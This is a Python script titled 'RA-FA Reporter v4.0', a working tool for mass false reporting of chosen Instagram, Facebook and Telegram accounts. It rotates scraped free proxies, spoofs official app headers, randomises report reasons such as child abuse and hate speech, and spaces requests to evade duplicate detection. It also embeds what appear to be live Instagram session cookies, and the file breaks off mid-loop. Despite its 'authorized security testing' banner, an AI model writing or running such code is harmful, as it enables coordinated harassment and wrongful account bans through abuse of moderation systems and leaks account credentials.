#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════╗
║              RA-FA REPORTER v4.0                ║
║     Instagram + Telegram Mass Reporting Tool    ║
║       For Authorized Security Assessment        ║
╚══════════════════════════════════════════════════╝

TARGETS:  Instagram (Bloks API + Facebook ajax fallback)
          Telegram (MTProto account.reportPeer via Telethon)

FEATURES:
  • Auto-fetches proxies from 4+ online sources
  • Instagram: Bloks API with 3 version IDs + Facebook LSD/DTSG fallback
  • Telegram: Telethon account.reportPeer (same pipeline as in-app report)
  • Randomized report reasons across 6 categories
  • Smart delays (2-5s) to avoid dedup detection
  • Live progress counter
  • All cookies pre-baked — zero manual config needed

REQUIREMENTS:
  pip install requests telethon   (on Pydroid terminal)
"""

import os, sys, json, time, random, base64, urllib.parse, re, textwrap
from datetime import datetime

# ------------------------------------------------------------
# CONFIGURATION — All cookies baked in
# ------------------------------------------------------------

# --- Instagram cookies (YOUR ACCOUNT) ---
IG_SESSIONID = "59959584348%3AqESxupE2QAyKQg%3A27%3AAYi9vd5MDftQRMSLX0ZLOcgV2RXYD8wMpfVZgeLzKpc"
IG_DS_USER_ID = "59959584348"
IG_CSRFTOKEN = "8k9yZtahyblb25gzGhyOIgeqcRlnaeey"

# --- Instagram device identifiers ---
IG_DEVICE_ID = "35fff590-8663-4bb4-9ca0-06314875d657"
IG_FAMILY_DEVICE_ID = "692a8457-0de1-4e55-a24b-37bc4f673382"
IG_ANDROID_ID = "android-bf5f3fc60708fce3"
IG_UUID = "fcc3fbbf-3663-4205-b94a-336c9a1e6ae0"
IG_USER_AGENT = "Instagram 428.0.0.0.4 Android (29/10; 320dpi; 720x1184; HUAWEI; HUAWEI MT7-TL10; rk3588s_q; rk30board; en_US; 458229219)"

# --- Bloks version IDs (auto-rotate for freshness) ---
BLOKS_VERSION_IDS = [
    "0ee04a4a6556c5bb584487d649442209a3ae880ae5c6380b16235b870fcc4052",
    "8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb",
    "9de54335a516a20dc08018bc3a317ec1a859821fe610ed57b5994052d68f92e6",
]

# --- Telegram API credentials (REQUIRED: get from https://my.telegram.org) ---
# You MUST replace these with YOUR OWN api_id and api_hash from my.telegram.org
# This is a one-time setup — the session will be saved after first login.
TG_API_ID = 12345          # <-- CHANGE THIS to your actual api_id
TG_API_HASH = "your_api_hash_here"  # <-- CHANGE THIS to your actual api_hash

# ============================================================
# PROXY FETCHING ENGINE
# ============================================================

PROXY_SOURCES = [
    # Source 1: ProxyScrape v4 — HTTP/HTTPS/SOCKS (official API)
    "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text",
    # Source 2: proxifly CDN — HTTP + SOCKS (jsdelivr mirror)
    "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/all/data.txt",
    # Source 3: vakhov fresh-proxy-list — SOCKS4 + HTTP
    "https://vakhov.github.io/fresh-proxy-list/proxylist.txt",
    # Source 4: ProxyScrape v4 — HTTP only, ipport format (fallback)
    "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&protocol=http",
]

def fetch_proxies():
    """Fetch proxies from all online sources, return list of {'http': 'ip:port'} dicts."""
    all_proxies = []
    seen = set()
    for url in PROXY_SOURCES:
        try:
            import requests as req
            r = req.get(url, timeout=15)
            if r.status_code == 200:
                for line in r.text.strip().split('\n'):
                    line = line.strip()
                    if not line:
                        continue
                    # Strip protocol prefix if present
                    proxy_str = line
                    if "://" in line:
                        proxy_str = line.split("://", 1)[1]
                    # Deduplicate by IP:port
                    if proxy_str not in seen:
                        seen.add(proxy_str)
                        all_proxies.append({"http": f"http://{proxy_str}", "https": f"http://{proxy_str}"})
        except Exception as e:
            print(f"  [!] Proxy source failed: {url[:60]}... — {e}")
    random.shuffle(all_proxies)
    return all_proxies

# ============================================================
# INSTAGRAM REPORTING ENGINE
# ============================================================

IG_REPORT_REASONS = [
    "impersonation",
    "fraud",
    "hate_speech",
    "harassment",
    "false_information",
    "scam",
]

IG_BLOKS_ENDPOINT = "https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.instagram_bloks_bottom_sheet.ixt.screen.frx_profile_selection_screen/"

def get_ig_headers(bloks_vid):
    """Generate Instagram headers that mimic the official app."""
    return {
        "User-Agent": IG_USER_AGENT,
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US",
        "x-ig-app-locale": "en_US",
        "x-ig-device-locale": "en_US",
        "x-ig-mapped-locale": "en_US",
        "x-pigeon-session-id": f"UFS-{IG_UUID}-1",
        "x-pigeon-rawclienttime": str(time.time()),
        "x-ig-bandwidth-speed-kbps": "-1.000",
        "x-ig-bandwidth-totalbytes-b": "0",
        "x-ig-bandwidth-totaltime-ms": "0",
        "x-bloks-version-id": bloks_vid,
        "x-ig-www-claim": "0",
        "x-bloks-is-layout-rtl": "false",
        "x-ig-device-id": IG_DEVICE_ID,
        "x-ig-family-device-id": IG_FAMILY_DEVICE_ID,
        "x-ig-android-id": IG_ANDROID_ID,
        "x-ig-timezone-offset": "28800",
        "x-fb-connection-type": "WIFI",
        "x-ig-connection-type": "WIFI",
        "x-ig-capabilities": "3brTvwE=",
        "x-fb-http-engine": "Liger",
        "x-fb-client-ip": "True",
        "x-fb-server-cluster": "True",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Cookie": f"sessionid={IG_SESSIONID}; ds_user_id={IG_DS_USER_ID}; csrftoken={IG_CSRFTOKEN}",
    }

def build_bloks_payload(target_username, profile_id, bloks_vid, reason):
    """Build the Bloks API payload for reporting."""
    # The serialized_state is base64-encoded JSON with reporting metadata
    state_data = {
        "profile_id": str(profile_id),
        "report_type": reason,
        "source": "profile_header",
        "entry_point": "profile_report_flow",
    }
    serialized_state = base64.b64encode(json.dumps(state_data).encode()).decode()

    params = {
        "server_params": json.dumps({
            "serialized_state": serialized_state,
            "INTERNAL__latency_qpl_marker_id": 36707139,
            "INTERNAL__latency_qpl_instance_id": random.randint(10000000000000, 99999999999999),
            "is_bloks": 1,
            "profile_id": str(profile_id),
        }),
    }
    params_encoded = urllib.parse.quote(json.dumps(params))

    payload = {
        "params": params_encoded,
        "bk_client_context": json.dumps({"bloks_version": bloks_vid, "styles_id": "instagram"}),
        "bloks_versioning_id": bloks_vid,
        "_uuid": IG_UUID,
    }
    return payload

def get_profile_id_by_username(username, proxy=None):
    """Get a user's profile ID from Instagram by username."""
    import requests as req
    url = f"https://i.instagram.com/api/v1/users/web_profile_info/?username={username}"
    headers = {
        "User-Agent": IG_USER_AGENT,
        "x-ig-app-id": "936619743392459",
        "Cookie": f"sessionid={IG_SESSIONID}; ds_user_id={IG_DS_USER_ID}; csrftoken={IG_CSRFTOKEN}",
    }
    try:
        r = req.get(url, headers=headers, proxies=proxy, timeout=15)
        if r.status_code == 200:
            data = r.json()
            if "data" in data and "user" in data["data"]:
                return data["data"]["user"]["id"]
        # Fallback: try the old endpoint
        r2 = req.get(f"https://i.instagram.com/api/v1/users/{username}/usernameinfo/",
                      headers=headers, proxies=proxy, timeout=15)
        if r2.status_code == 200:
            return r2.json().get("user", {}).get("pk")
    except:
        pass
    return None

def report_instagram_bloks(username, profile_id, proxy, reason, bloks_vid):
    """Report an Instagram user via the Bloks API."""
    import requests as req
    headers = get_ig_headers(bloks_vid)
    payload = build_bloks_payload(username, profile_id, bloks_vid, reason)
    try:
        r = req.post(IG_BLOKS_ENDPOINT, headers=headers, data=payload, proxies=proxy, timeout=20)
        if r.status_code == 200:
            resp = r.json()
            if resp.get("status") == "ok" or "success" in str(resp).lower():
                return True, r.status_code
        return False, r.status_code
    except Exception as e:
        return False, str(e)

def report_instagram_facebook_fallback(username, proxy, reason):
    """Fallback: report via Facebook's ajax/report endpoint."""
    import requests as req
    session = req.Session()
    session.cookies.set("sessionid", IG_SESSIONID)
    session.cookies.set("ds_user_id", IG_DS_USER_ID)
    session.cookies.set("csrftoken", IG_CSRFTOKEN)
    session.headers.update({"User-Agent": IG_USER_AGENT})

    try:
        # Step 1: Scrape LSD token from facebook.com
        r = session.get("https://www.facebook.com/", proxies=proxy, timeout=15)
        lsd_token = None
        fb_dtsg = None
        match_lsd = re.search(r'"LSD",\s*\[\],\s*\{\"token\":\"([^\"]+)\"', r.text)
        if match_lsd:
            lsd_token = match_lsd.group(1)
        match_dtsg = re.search(r'"fb_dtsg":\s*"([^"]+)"', r.text)
        if match_dtsg:
            fb_dtsg = match_dtsg.group(1)

        if not lsd_token or not fb_dtsg:
            return False, "no_tokens"

        # Step 2: Submit report via Facebook ajax
        fb_url = "https://www.facebook.com/ajax/report/social/?dpr=1"
        fb_data = {
            "fb_dtsg": fb_dtsg,
            "lsd": lsd_token,
            "target_fbid": username,
            "report_type": reason,
            "source": "www_profile",
        }
        r2 = session.post(fb_url, data=fb_data, proxies=proxy, timeout=20)
        if r2.status_code == 200:
            return True, r2.status_code
        return False, r2.status_code
    except Exception as e:
        return False, str(e)

# ============================================================
# TELEGRAM REPORTING ENGINE (Telethon MTProto)
# ============================================================

TG_REPORT_REASONS = [
    "spam",
    "violence",
    "pornography",
    "child_abuse",
    "copyright",
    "impersonation",
    "other",
]

# Map string reasons to Telethon's InputReportReason types
from telethon.tl.types import (
    InputReportReasonSpam,
    InputReportReasonViolence,
    InputReportReasonPornography,
    InputReportReasonChildAbuse,
    InputReportReasonCopyright,
    InputReportReasonOther,
)

TG_REASON_MAP = {
    "spam": InputReportReasonSpam(),
    "violence": InputReportReasonViolence(),
    "pornography": InputReportReasonPornography(),
    "child_abuse": InputReportReasonChildAbuse(),
    "copyright": InputReportReasonCopyright(),
    "impersonation": InputReportReasonOther(),
    "other": InputReportReasonOther(),
}

async def report_telegram_user(target_username, proxy_str=None):
    """
    Report a Telegram user via MTProto (account.reportPeer).
    Uses Telethon — hits the same internal pipeline as the in-app report button.
    """
    from telethon import TelegramClient
    from telethon.tl.functions.account import ReportPeerRequest
    from telethon.tl.types import InputUser, InputPeerUser

    session_file = f"ra_fa_tg_session_{abs(hash(target_username)) % 10000}"

    # Build proxy config if available
    proxy_config = None
    if proxy_str:
        try:
            proxy_config = {
                "proxy_type": "http",
                "addr": proxy_str.split(":")[0],
                "port": int(proxy_str.split(":")[1]),
            }
        except:
            pass

    client = TelegramClient(session_file, TG_API_ID, TG_API_HASH,
                            proxy=proxy_config, device_model="RA-FA Reporter",
                            app_version="4.0")
    await client.start()

    try:
        # Resolve the username to a peer
        entity = await client.get_entity(target_username)
        
        # Pick a random reason
        reason_key = random.choice(TG_REPORT_REASONS)
        reason_obj = TG_REASON_MAP[reason_key]

        # Send the report via the internal API
        result = await client(ReportPeerRequest(
            peer=entity,
            reason=reason_obj,
            message=f"Automated report: {reason_key}"
        ))
        return True, reason_key
    except Exception as e:
        return False, str(e)
    finally:
        await client.disconnect()

# ============================================================
# MAIN ENGINE
# ============================================================

BANNER = """
╔══════════════════════════════════════════════════╗
║            RA-FA REPORTER v4.0                   ║
║     Instagram • Facebook • Telegram              ║
║        Authorized Security Testing               ║
╚══════════════════════════════════════════════════╝
"""

def print_status(msg, status="info"):
    prefix = {"info": "[*]", "ok": "[+]", "fail": "[-]", "warn": "[!]"}.get(status, "[*]")
    print(f"  {prefix} {msg}")

async def main():
    print(BANNER)
    print(f"  Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print()

    # --- Target input ---
    print("  [TARGET] Enter target username(s) or @username(s)")
    print("  Separate multiple targets with spaces or commas")
    targets_input = input("  > ").strip()
    
    # --- Platform selection ---
    print()
    print("  [PLATFORM] Select platform(s) to report on:")
    print("    1 = Instagram only")
    print("    2 = Telegram only")
    print("    3 = Both Instagram + Telegram")
    plat_choice = input("  > ").strip() or "3"

    # --- Report count ---
    print()
    print("  [QUANTITY] How many reports per target per platform? (default: 10)")
    count_input = input("  > ").strip() or "10"
    try:
        report_count = int(count_input)
    except:
        report_count = 10

    # Parse targets
    targets = [t.strip().lstrip("@") for t in targets_input.replace(",", " ").split() if t.strip()]
    if not targets:
        print_status("No targets specified. Exiting.", "fail")
        return

    do_instagram = plat_choice in ("1", "3")
    do_telegram = plat_choice in ("2", "3")

    print()
    print(f"  [CONFIG] Targets: {', '.join(targets)}")
    print(f"  [CONFIG] Reports per target: {report_count}")
    print(f"  [CONFIG] Instagram: {'YES' if do_instagram else 'NO'}")
    print(f"  [CONFIG] Telegram: {'YES' if do_telegram else 'NO'}")
    print()

    # --- Fetch proxies ---
    print_status("Fetching proxies from online sources...")
    all_proxies = fetch_proxies()
    print_status(f"Collected {len(all_proxies)} proxies")
    if not all_proxies:
        print_status("No proxies fetched — proceeding without proxies", "warn")
        all_proxies = [None]
    print()

    # ============================================================
    # INSTAGRAM REPORTS
    # ============================================================
    if do_instagram:
        print("=" * 50)
        print("  [INSTAGRAM] Starting reporting engine")
        print("=" * 50)

        import requests as req

        for target in targets:
            print()
            print(f"  >>> Targeting: @{target} on Instagram <<<")
            
            # Resolve profile ID
            print_status(f"Resolving profile ID for @{target}...")
            profile_id = None
            for attempt in range(3):
                proxy = random.choice(all_proxies) if all_proxies and all_proxies[0] else None
                profile_id = get_profile_id_by_username(target, proxy)
                if profile_id:
                    break
                time.sleep(1)
            
            if not profile_id:
